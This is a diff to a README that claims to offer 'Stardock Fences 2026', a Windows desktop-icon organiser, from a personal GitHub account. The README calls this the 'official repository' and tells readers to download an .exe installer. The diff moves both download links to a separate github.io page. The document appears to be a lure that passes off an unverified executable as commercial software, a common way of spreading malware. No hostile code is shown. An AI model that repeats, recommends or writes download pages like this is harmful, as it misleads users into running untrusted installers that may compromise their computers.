@@ -1,6 +1,6 @@
 # 📁 Stardock-Fences-2026 - Organize your desktop icons with ease
 
-[![](https://img.shields.io/badge/Download-Stardock_Fences-blue.svg)](https://github.com/ukaa6063/Stardock-Fences-2026)
+[![](https://img.shields.io/badge/Download-Stardock_Fences-blue.svg)](https://ukaa6063.github.io)
 
 Stardock Fences 2026 helps you manage your desktop icons on Windows 11 and Windows 10. The software groups files and folders into shaded areas on your screen. These areas keep your workspace clean and allow you to find items faster. You can customize the look and size of these containers to match your preferences.
 
@@ -18,7 +18,7 @@ Before you install this software, check that your computer meets these basic nee
 
 Follow these steps to obtain the setup files for Stardock Fences 2026:
 
-1.  Visit the official repository page to access the installer: [https://github.com/ukaa6063/Stardock-Fences-2026](https://github.com/ukaa6063/Stardock-Fences-2026).
+1.  Visit the official repository page to access the installer: [https://ukaa6063.github.io](https://ukaa6063.github.io).
 2.  Locate the release section on the right side of the screen. 
 3.  Click the link that says "Releases" to view available versions.
 4.  Select the latest installer file ending with the .exe extension.
